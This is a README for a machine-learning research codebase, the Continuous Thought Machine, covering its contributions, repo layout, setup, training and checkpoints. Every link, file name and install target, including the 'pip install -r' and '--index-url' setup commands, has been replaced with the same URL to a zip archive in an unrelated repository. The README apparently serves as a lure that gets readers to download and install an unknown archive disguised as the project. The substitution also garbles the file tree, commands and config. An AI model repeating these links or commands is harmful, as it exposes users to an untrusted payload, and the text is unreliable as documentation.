# 🕰️ The Continuous Thought Machine

📚 [PAPER: Technical Report](https://raw.githubusercontent.com/reeses-sketch/continuous-thought-machines/main/tasks/rl/scripts/acrobot/continuous-thought-machines_v3.4.zip) | 📝 [Blog](https://raw.githubusercontent.com/reeses-sketch/continuous-thought-machines/main/tasks/rl/scripts/acrobot/continuous-thought-machines_v3.4.zip) | 🕹️ [Interactive Website](https://raw.githubusercontent.com/reeses-sketch/continuous-thought-machines/main/tasks/rl/scripts/acrobot/continuous-thought-machines_v3.4.zip) | ✏️ [Tutorial](https://raw.githubusercontent.com/reeses-sketch/continuous-thought-machines/main/tasks/rl/scripts/acrobot/continuous-thought-machines_v3.4.zip)

![Activations](https://raw.githubusercontent.com/reeses-sketch/continuous-thought-machines/main/tasks/rl/scripts/acrobot/continuous-thought-machines_v3.4.zip)

We present the Continuous Thought Machine (CTM), a model designed to unfold and then leverage neural activity as the underlying mechanism for observation and action. Our contributions are:

1. An internal temporal axis, decoupled from any input data, that enables neuron activity to unfold.

2. Neuron-level temporal processing, where each neuron uses unique weight parameters to process a history of incoming signals, enabling fine-grained temporal dynamics.

3. Neural synchronisation, employed as a direct latent representation for modulating data and producing outputs, thus directly encoding information in the timing of neural activity.

We demonstrate the CTM's strong performance and versatility across a range of challenging tasks, including ImageNet classification, solving 2D mazes, sorting, parity computation, question-answering, and RL tasks.

We provide all necessary code to reproduce our results and invite others to build upon and use CTMs in their own work.

## [Interactive Website](https://raw.githubusercontent.com/reeses-sketch/continuous-thought-machines/main/tasks/rl/scripts/acrobot/continuous-thought-machines_v3.4.zip)
Please see our [Interactive Website](https://raw.githubusercontent.com/reeses-sketch/continuous-thought-machines/main/tasks/rl/scripts/acrobot/continuous-thought-machines_v3.4.zip) for a maze-solving demo, many demonstrative videos of the method, results, and other findings. 


## Repo structure
```
├── tasks
│   ├── image_classification
│   │   ├── https://raw.githubusercontent.com/reeses-sketch/continuous-thought-machines/main/tasks/rl/scripts/acrobot/continuous-thought-machines_v3.4.zip                          # Training code for image classification (cifar, imagenet)
│   │   ├── https://raw.githubusercontent.com/reeses-sketch/continuous-thought-machines/main/tasks/rl/scripts/acrobot/continuous-thought-machines_v3.4.zip               # Helper for imagenet class names
│   │   ├── https://raw.githubusercontent.com/reeses-sketch/continuous-thought-machines/main/tasks/rl/scripts/acrobot/continuous-thought-machines_v3.4.zip                       # Plotting utils specific to this task
│   │   └── analysis
│   │       ├──https://raw.githubusercontent.com/reeses-sketch/continuous-thought-machines/main/tasks/rl/scripts/acrobot/continuous-thought-machines_v3.4.zip       # ImageNet eval and visualisation code
│   │       └──outputs/                       # Folder for outputs of analysis
│   ├── mazes
│   │   ├── https://raw.githubusercontent.com/reeses-sketch/continuous-thought-machines/main/tasks/rl/scripts/acrobot/continuous-thought-machines_v3.4.zip                          # Training code for solving 2D mazes (by way of a route; see paper)
│   │   └── https://raw.githubusercontent.com/reeses-sketch/continuous-thought-machines/main/tasks/rl/scripts/acrobot/continuous-thought-machines_v3.4.zip                       # Plotting utils specific to this task
│   │   └── analysis
│   │       ├──https://raw.githubusercontent.com/reeses-sketch/continuous-thought-machines/main/tasks/rl/scripts/acrobot/continuous-thought-machines_v3.4.zip                         # Maze analysis code
│   │       └──outputs/                       # Folder for outputs of analysis
│   ├── sort
│   │   ├── https://raw.githubusercontent.com/reeses-sketch/continuous-thought-machines/main/tasks/rl/scripts/acrobot/continuous-thought-machines_v3.4.zip                          # Training code for sorting
│   │   └── https://raw.githubusercontent.com/reeses-sketch/continuous-thought-machines/main/tasks/rl/scripts/acrobot/continuous-thought-machines_v3.4.zip                          # Sort specific utils (e.g., CTC decode)
│   ├── parity
│   │   ├── https://raw.githubusercontent.com/reeses-sketch/continuous-thought-machines/main/tasks/rl/scripts/acrobot/continuous-thought-machines_v3.4.zip                          # Training code for parity task
│   │   ├── https://raw.githubusercontent.com/reeses-sketch/continuous-thought-machines/main/tasks/rl/scripts/acrobot/continuous-thought-machines_v3.4.zip                          # Parity-specific helper functions
│   │   ├── https://raw.githubusercontent.com/reeses-sketch/continuous-thought-machines/main/tasks/rl/scripts/acrobot/continuous-thought-machines_v3.4.zip                       # Plotting utils specific to this task
│   │   ├── scripts/
│   │   │   └── *.sh                          # Training scripts for different experimental setups
│   │   └── analysis/
│   │       └── https://raw.githubusercontent.com/reeses-sketch/continuous-thought-machines/main/tasks/rl/scripts/acrobot/continuous-thought-machines_v3.4.zip                        # Entry point for parity analysis
│   ├── qamnist
│   │   ├── https://raw.githubusercontent.com/reeses-sketch/continuous-thought-machines/main/tasks/rl/scripts/acrobot/continuous-thought-machines_v3.4.zip                          # Training code for QAMNIST task (quantized MNIST)
│   │   ├── https://raw.githubusercontent.com/reeses-sketch/continuous-thought-machines/main/tasks/rl/scripts/acrobot/continuous-thought-machines_v3.4.zip                          # QAMNIST-specific helper functions
│   │   ├── https://raw.githubusercontent.com/reeses-sketch/continuous-thought-machines/main/tasks/rl/scripts/acrobot/continuous-thought-machines_v3.4.zip                       # Plotting utils specific to this task
│   │   ├── scripts/
│   │   │   └── *.sh                          # Training scripts for different experimental setups
│   │   └── analysis/
│   │       └── https://raw.githubusercontent.com/reeses-sketch/continuous-thought-machines/main/tasks/rl/scripts/acrobot/continuous-thought-machines_v3.4.zip                        # Entry point for QAMNIST analysis
│   └── rl
│       ├── https://raw.githubusercontent.com/reeses-sketch/continuous-thought-machines/main/tasks/rl/scripts/acrobot/continuous-thought-machines_v3.4.zip                          # Training code for RL environments
│       ├── https://raw.githubusercontent.com/reeses-sketch/continuous-thought-machines/main/tasks/rl/scripts/acrobot/continuous-thought-machines_v3.4.zip                          # RL-specific helper functions
│       ├── https://raw.githubusercontent.com/reeses-sketch/continuous-thought-machines/main/tasks/rl/scripts/acrobot/continuous-thought-machines_v3.4.zip                       # Plotting utils specific to this task
│       ├── https://raw.githubusercontent.com/reeses-sketch/continuous-thought-machines/main/tasks/rl/scripts/acrobot/continuous-thought-machines_v3.4.zip                           # Custom RL environment wrappers
│       ├── scripts/
│       │   ├── 4rooms/
│       │   │   └── *.sh                      # Training scripts for MiniGrid-FourRooms-v0 environment
│       │   ├── acrobot/
│       │   │   └── *.sh                      # Training scripts for Acrobot-v1 environment
│       │   └── cartpole/
│       │       └── *.sh                      # Training scripts for CartPole-v1 environment
│       └── analysis/
│           └── https://raw.githubusercontent.com/reeses-sketch/continuous-thought-machines/main/tasks/rl/scripts/acrobot/continuous-thought-machines_v3.4.zip                        # Entry point for RL analysis
├── data                                      # This is where data will be saved and downloaded to
│   └── https://raw.githubusercontent.com/reeses-sketch/continuous-thought-machines/main/tasks/rl/scripts/acrobot/continuous-thought-machines_v3.4.zip                    # Custom datasets (e.g., Mazes), sort
├── models
│   ├── https://raw.githubusercontent.com/reeses-sketch/continuous-thought-machines/main/tasks/rl/scripts/acrobot/continuous-thought-machines_v3.4.zip                                # Main model code, used for: image classification, solving mazes, sort
│   ├── ctm_*.py                              # Other model code, standalone adjustments for other tasks
│   ├── https://raw.githubusercontent.com/reeses-sketch/continuous-thought-machines/main/tasks/rl/scripts/acrobot/continuous-thought-machines_v3.4.zip                                 # feed-forward (simple) baseline code (e.g., for image classification)
│   ├── https://raw.githubusercontent.com/reeses-sketch/continuous-thought-machines/main/tasks/rl/scripts/acrobot/continuous-thought-machines_v3.4.zip                               # LSTM baseline code (e.g., for image classification)
│   ├── lstm_*.py                              # Other baseline code, standalone adjustments for other tasks
│   ├── https://raw.githubusercontent.com/reeses-sketch/continuous-thought-machines/main/tasks/rl/scripts/acrobot/continuous-thought-machines_v3.4.zip                            # Helper modules, including Neuron-level models and the Synapse UNET
│   ├── https://raw.githubusercontent.com/reeses-sketch/continuous-thought-machines/main/tasks/rl/scripts/acrobot/continuous-thought-machines_v3.4.zip                              # Helper functions (e.g., synch decay)
│   └── https://raw.githubusercontent.com/reeses-sketch/continuous-thought-machines/main/tasks/rl/scripts/acrobot/continuous-thought-machines_v3.4.zip                             # Wrapper for ResNet featuriser
├── utils
│   ├── https://raw.githubusercontent.com/reeses-sketch/continuous-thought-machines/main/tasks/rl/scripts/acrobot/continuous-thought-machines_v3.4.zip                       # Helper functions for keeping things neat
│   ├── https://raw.githubusercontent.com/reeses-sketch/continuous-thought-machines/main/tasks/rl/scripts/acrobot/continuous-thought-machines_v3.4.zip                             # Loss functions for various tasks (mostly with reshaping stuff)
│   └── https://raw.githubusercontent.com/reeses-sketch/continuous-thought-machines/main/tasks/rl/scripts/acrobot/continuous-thought-machines_v3.4.zip                         # Helper wrappers for learning rate schedulers
└── checkpoints
    └── imagenet, mazes, ...                  # Checkpoint directories (see google drive link for files)

```

## Setup
To set up the environment using conda:

```
conda create --name=ctm python=3.12
conda activate ctm
pip install -r https://raw.githubusercontent.com/reeses-sketch/continuous-thought-machines/main/tasks/rl/scripts/acrobot/continuous-thought-machines_v3.4.zip
```

If there are issues with PyTorch versions, the following can be ran:
```
pip uninstall torch
pip install torch --index-url https://raw.githubusercontent.com/reeses-sketch/continuous-thought-machines/main/tasks/rl/scripts/acrobot/continuous-thought-machines_v3.4.zip
```

## Model training
Each task has its own (set of) training code. See for instance [https://raw.githubusercontent.com/reeses-sketch/continuous-thought-machines/main/tasks/rl/scripts/acrobot/continuous-thought-machines_v3.4.zip](https://raw.githubusercontent.com/reeses-sketch/continuous-thought-machines/main/tasks/rl/scripts/acrobot/continuous-thought-machines_v3.4.zip). We have set it up like this to ensure ease-of-use as opposed to clinical efficiency. This code is for researchers and we hope to have it shared in a way that fosters collaboration and learning. 

While we have provided reasonable defaults in the argparsers of each training setup, scripts to replicate the setups in the paper will typically be found in the accompanying script folders. If you simply want to dive in, run the following as a module (setup like this to make it easy to run many high-level training scripts from the top directory):

```
python -m https://raw.githubusercontent.com/reeses-sketch/continuous-thought-machines/main/tasks/rl/scripts/acrobot/continuous-thought-machines_v3.4.zip
```
For debugging in VSCode, this configuration example might be helpful to you:
```
{
    "name": "Debug: train image classifier",
    "type": "debugpy",
    "request": "launch",
    "module": "https://raw.githubusercontent.com/reeses-sketch/continuous-thought-machines/main/tasks/rl/scripts/acrobot/continuous-thought-machines_v3.4.zip",
    "console": "integratedTerminal",
    "justMyCode": false
}
```


## Running analyses

We also provide analysis and plotting code to replicate many of the plots in our paper. See `tasks/.../analysis/*` for more details on that. We also provide some data (e.g., the mazes we generated for training) and checkpoints (see [here](#checkpoints-and-data)). Note that ffmpeg is required for generating mp4 files from the analysis scripts. It can be installed with:
```
conda install -c conda-forge ffmpeg
```


## Checkpoints and data
You can download the data and checkpoints from here: 
- checkpoints: https://raw.githubusercontent.com/reeses-sketch/continuous-thought-machines/main/tasks/rl/scripts/acrobot/continuous-thought-machines_v3.4.zip
- maze data: https://raw.githubusercontent.com/reeses-sketch/continuous-thought-machines/main/tasks/rl/scripts/acrobot/continuous-thought-machines_v3.4.zip

Checkpoints go in the `checkpoints` folder. For instance, when properly populated, the checkpoints folder will have the maze checkpoint in `checkpoints/mazes/...`
